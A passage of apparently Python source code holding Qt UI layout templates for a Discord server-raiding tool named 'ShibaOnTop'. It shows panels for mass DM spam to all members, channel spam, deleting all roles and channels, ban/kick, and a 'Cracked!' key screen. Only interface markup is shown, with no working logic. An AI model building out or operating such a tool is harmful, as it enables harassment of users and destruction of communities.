height: 25px;</string>
   </property>
   <property name="text">
    <string>Nicknames</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuBanKick">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>170</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Ban/Kick</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuServerInfo">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>80</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Server info</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuBotInfo">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>50</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Bot info</string>
   </property>
  </widget>
  <widget class="QPushButton" name="MenuDMSpam">
   <property name="geometry">
    <rect>
     <x>10</x>
     <y>230</y>
     <width>121</width>
     <height>25</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>10</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #660708;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>DM Spam</string>
   </property>
  </widget>
  <widget class="QCheckBox" name="AllUser">
   <property name="geometry">
    <rect>
     <x>470</x>
     <y>70</y>
     <width>151</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #ffffff;
border-radius: 8px;</string>
   </property>
   <property name="text">
    <string>All server members</string>
   </property>
  </widget>
  <widget class="QLineEdit" name="SpamUserEdit">
   <property name="geometry">
    <rect>
     <x>170</x>
     <y>70</y>
     <width>291</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string/>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
   <property name="placeholderText">
    <string>User ID</string>
   </property>
  </widget>
  <widget class="QPushButton" name="UserStopSpammingButton">
   <property name="geometry">
    <rect>
     <x>340</x>
     <y>200</y>
     <width>161</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Stop spamming</string>
   </property>
  </widget>
  <widget class="QLabel" name="InsertTokenLabel_2">
   <property name="geometry">
    <rect>
     <x>190</x>
     <y>10</y>
     <width>420</width>
     <height>40</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>16</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #ffffff;</string>
   </property>
   <property name="text">
    <string>DM Spam</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QPlainTextEdit" name="plainTextEdit">
   <property name="geometry">
    <rect>
     <x>170</x>
     <y>110</y>
     <width>461</width>
     <height>81</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="placeholderText">
    <string>Text</string>
   </property>
  </widget>
  <widget class="QPushButton" name="UserSpammingButton">
   <property name="geometry">
    <rect>
     <x>170</x>
     <y>200</y>
     <width>161</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Start spamming</string>
   </property>
  </widget>
  <widget class="QDoubleSpinBox" name="doubleSpinBox">
   <property name="geometry">
    <rect>
     <x>570</x>
     <y>200</y>
     <width>61</width>
     <height>31</height>
    </rect>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="value">
    <double>0.200000000000000</double>
   </property>
  </widget>
  <widget class="QLabel" name="InsertTokenLabel_3">
   <property name="geometry">
    <rect>
     <x>510</x>
     <y>200</y>
     <width>61</width>
     <height>31</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #ffffff;</string>
   </property>
   <property name="text">
    <string>Timeout: </string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QLabel" name="BotName_8">
   <property name="geometry">
    <rect>
     <x>190</x>
     <y>40</y>
     <width>421</width>
     <height>21</height>
    </rect>
   </property>
   <property name="mouseTracking">
    <bool>false</bool>
   </property>
   <property name="layoutDirection">
    <enum>Qt::LeftToRight</enum>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #ffffff;</string>
   </property>
   <property name="text">
    <string>Insert &quot;[mention]&quot; if you want to mention the user</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QListWidget" name="Log">
   <property name="geometry">
    <rect>
     <x>170</x>
     <y>240</y>
     <width>461</width>
     <height>111</height>
    </rect>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""

authTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>Form</class>
 <widget class="QWidget" name="Form">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>697</width>
    <height>360</height>
   </rect>
  </property>
  <property name="windowTitle">
   <string>Form</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QLabel" name="InsertTokenLabel_2">
   <property name="geometry">
    <rect>
     <x>250</x>
     <y>10</y>
     <width>221</width>
     <height>40</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>20</pointsize>
     <weight>75</weight>
     <italic>true</italic>
     <bold>true</bold>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #660708;</string>
   </property>
   <property name="text">
    <string>Cracked!</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QLabel" name="InfoLabel">
   <property name="geometry">
    <rect>
     <x>205</x>
     <y>70</y>
     <width>321</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">color: #ffffff;</string>
   </property>
   <property name="text">
    <string>Please insert your product key</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
  </widget>
  <widget class="QLineEdit" name="KeyEdit">
   <property name="geometry">
    <rect>
     <x>200</x>
     <y>120</y>
     <width>331</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="alignment">
    <set>Qt::AlignCenter</set>
   </property>
   <property name="placeholderText">
    <string>Product Key</string>
   </property>
  </widget>
  <widget class="QPushButton" name="LoginButton">
   <property name="geometry">
    <rect>
     <x>200</x>
     <y>160</y>
     <width>241</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Login</string>
   </property>
  </widget>
  <widget class="QPushButton" name="TutorialButton">
   <property name="geometry">
    <rect>
     <x>450</x>
     <y>160</y>
     <width>81</width>
     <height>30</height>
    </rect>
   </property>
   <property name="font">
    <font>
     <family>Arial</family>
     <pointsize>12</pointsize>
    </font>
   </property>
   <property name="cursor">
    <cursorShape>PointingHandCursor</cursorShape>
   </property>
   <property name="styleSheet">
    <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
   </property>
   <property name="text">
    <string>Tutorial</string>
   </property>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""


RolesTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>MainWindow</class>
 <widget class="QMainWindow" name="MainWindow">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>700</width>
    <height>360</height>
   </rect>
  </property>
  <property name="font">
   <font>
    <family>Arial</family>
    <pointsize>12</pointsize>
   </font>
  </property>
  <property name="windowTitle">
   <string>MainWindow</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QWidget" name="centralwidget">
   <widget class="QLabel" name="InsertTokenLabel_2">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>10</y>
      <width>420</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>16</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Roles</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QLabel" name="label">
    <property name="geometry">
     <rect>
      <x>0</x>
      <y>0</y>
      <width>141</width>
      <height>381</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="indent">
     <number>-1</number>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuRoles">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>140</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #660708;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Roles</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuChannels">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>110</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channels</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuServerInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>80</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Server info</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBanKick">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>170</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Ban/Kick</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBotInfo">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>50</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Bot info</string>
    </property>
   </widget>
   <widget class="QLabel" name="label_2">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>10</y>
      <width>121</width>
      <height>31</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>14</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
color: #ffffff;</string>
    </property>
    <property name="text">
     <string>ShibaOnTop</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuCredits">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>320</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Credits</string>
    </property>
   </widget>
   <widget class="QLabel" name="BotName_4">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>60</y>
      <width>121</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Roles name:</string>
    </property>
   </widget>
   <widget class="QLineEdit" name="NameEdit">
    <property name="geometry">
     <rect>
      <x>300</x>
      <y>60</y>
      <width>240</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
    <property name="placeholderText">
     <string>Name</string>
    </property>
   </widget>
   <widget class="QCheckBox" name="Random">
    <property name="geometry">
     <rect>
      <x>550</x>
      <y>60</y>
      <width>91</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
color: #ffffff;
border-radius: 6px;</string>
    </property>
    <property name="text">
     <string>Random</string>
    </property>
   </widget>
   <widget class="QLabel" name="BotName_6">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>135</y>
      <width>461</width>
      <height>20</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Log</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="GenerateButton">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>100</y>
      <width>181</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Start</string>
    </property>
   </widget>
   <widget class="QPushButton" name="StopButton">
    <property name="geometry">
     <rect>
      <x>360</x>
      <y>100</y>
      <width>181</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Stop</string>
    </property>
   </widget>
   <widget class="QLineEdit" name="timeout">
    <property name="geometry">
     <rect>
      <x>550</x>
      <y>100</y>
      <width>61</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="inputMethodHints">
     <set>Qt::ImhPreferNumbers</set>
    </property>
    <property name="text">
     <string>0.2</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
    <property name="placeholderText">
     <string>Timeout</string>
    </property>
   </widget>
   <widget class="QListWidget" name="Log">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>170</y>
      <width>441</width>
      <height>121</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
   </widget>
   <widget class="QPushButton" name="DeleteAll">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>300</y>
      <width>211</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Delete all roles</string>
    </property>
   </widget>
   <widget class="QPushButton" name="Clear">
    <property name="geometry">
     <rect>
      <x>400</x>
      <y>300</y>
      <width>211</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Clear</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuNicknames">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>260</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Nicknames</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuDMSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>230</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>DM Spam</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuSpam">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>200</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Channel Spam</string>
    </property>
   </widget>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"""


ChannelsTemplate = """<?xml version="1.0" encoding="UTF-8"?>
<ui version="4.0">
 <class>MainWindow</class>
 <widget class="QMainWindow" name="MainWindow">
  <property name="geometry">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>700</width>
    <height>360</height>
   </rect>
  </property>
  <property name="font">
   <font>
    <family>Arial</family>
    <pointsize>12</pointsize>
   </font>
  </property>
  <property name="windowTitle">
   <string>MainWindow</string>
  </property>
  <property name="styleSheet">
   <string notr="true">background-color:  #0B090A;
font-family: &quot;Arial&quot;;</string>
  </property>
  <widget class="QWidget" name="centralwidget">
   <widget class="QLabel" name="InsertTokenLabel_2">
    <property name="geometry">
     <rect>
      <x>190</x>
      <y>10</y>
      <width>420</width>
      <height>40</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>16</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Channels</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QLineEdit" name="NameEdit">
    <property name="geometry">
     <rect>
      <x>290</x>
      <y>70</y>
      <width>231</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
    <property name="placeholderText">
     <string>Name</string>
    </property>
   </widget>
   <widget class="QLabel" name="Label">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>70</y>
      <width>101</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Channels name:</string>
    </property>
   </widget>
   <widget class="QCheckBox" name="Random">
    <property name="geometry">
     <rect>
      <x>540</x>
      <y>70</y>
      <width>91</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;
border-radius: 8px;</string>
    </property>
    <property name="text">
     <string>Random</string>
    </property>
   </widget>
   <widget class="QPushButton" name="GenerateEdit">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>110</y>
      <width>181</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Start</string>
    </property>
   </widget>
   <widget class="QLabel" name="BotName_6">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>145</y>
      <width>461</width>
      <height>20</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">color: #ffffff;</string>
    </property>
    <property name="text">
     <string>Log</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
   </widget>
   <widget class="QPushButton" name="StopEdit">
    <property name="geometry">
     <rect>
      <x>360</x>
      <y>110</y>
      <width>171</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Stop</string>
    </property>
   </widget>
   <widget class="QListWidget" name="Log">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>180</y>
      <width>461</width>
      <height>111</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="autoScroll">
     <bool>true</bool>
    </property>
    <property name="autoScrollMargin">
     <number>5</number>
    </property>
   </widget>
   <widget class="QPushButton" name="DeleteAll">
    <property name="geometry">
     <rect>
      <x>170</x>
      <y>300</y>
      <width>211</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Delete all channels</string>
    </property>
   </widget>
   <widget class="QLineEdit" name="timeout">
    <property name="geometry">
     <rect>
      <x>550</x>
      <y>110</y>
      <width>61</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="inputMethodHints">
     <set>Qt::ImhPreferNumbers</set>
    </property>
    <property name="text">
     <string>0.2</string>
    </property>
    <property name="alignment">
     <set>Qt::AlignCenter</set>
    </property>
    <property name="placeholderText">
     <string>Timeout</string>
    </property>
   </widget>
   <widget class="QPushButton" name="Clear">
    <property name="geometry">
     <rect>
      <x>420</x>
      <y>300</y>
      <width>211</width>
      <height>30</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>12</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #0B090A;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Clear</string>
    </property>
   </widget>
   <widget class="QLabel" name="label">
    <property name="geometry">
     <rect>
      <x>0</x>
      <y>-10</y>
      <width>141</width>
      <height>381</height>
     </rect>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;</string>
    </property>
    <property name="text">
     <string/>
    </property>
    <property name="indent">
     <number>-1</number>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuBanKick">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>170</y>
      <width>121</width>
      <height>25</height>
     </rect>
    </property>
    <property name="font">
     <font>
      <family>Arial</family>
      <pointsize>10</pointsize>
     </font>
    </property>
    <property name="cursor">
     <cursorShape>PointingHandCursor</cursorShape>
    </property>
    <property name="styleSheet">
     <string notr="true">background-color: #161A1D;
border: 2px solid #660708;
color: #ffffff;
border-radius: 6px;
height: 25px;</string>
    </property>
    <property name="text">
     <string>Ban/Kick</string>
    </property>
   </widget>
   <widget class="QPushButton" name="MenuRoles">
    <property name="geometry">
     <rect>
      <x>10</x>
      <y>140</y>
      <width>121</width>
